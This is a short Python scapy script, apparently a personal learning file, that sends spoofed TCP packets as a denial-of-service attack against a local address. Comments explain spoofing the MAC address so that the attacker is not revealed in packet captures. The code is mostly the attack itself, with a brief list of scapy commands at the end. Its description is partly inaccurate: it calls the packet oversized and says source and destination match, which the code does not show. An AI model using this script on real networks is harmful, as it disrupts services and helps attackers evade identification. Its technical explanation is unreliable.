#!/usr/bin/env python
import scapy.all as scapy

'''
A DoS attack that sends an oversized packet to the target with the same source and destination
IP address, as well as the same source and destination port.
It doesn't always crash the system but will slow it down considerably. For web servers, 
slowing them down is effectively a Denial of Service (DoS) .
'''
scapy.send(scapy.IP(src='192.168.0.102', dst='192.168.0.1')/scapy.TCP(sport=80, dport=80), count=2) 

'''
Here, I Spoof the src IP and send 1000 fake packets to the destination but there is a one
problem, your MAC address can be revealed in a DOS attack because scapy will automatically
detect the src MAC address. ( captured in Wireshark or any other sniffing tool).

In order to make a successfull DOS attack, you have to spoof your MAC address as well.
'''
scapy.sendp(scapy.Ether(src='aa:bb:cc:dd:ee:ff')/scapy.IP(src='192.168.0.102', dst='192.168.0.1')/scapy.TCP(sport=135, dport=135), count=2)

'''
	This will send packets at layer 2 with spoofed MAC and spoofed IP to the target.

ls()		--> list supported protocol
lsc()		--> scapy's built-in functions
conf		--> displays current configurations
send()		--> send packets at layer 3
sendp() 	--> send packets at layaer 2
help(sr)	--> to get more help
'''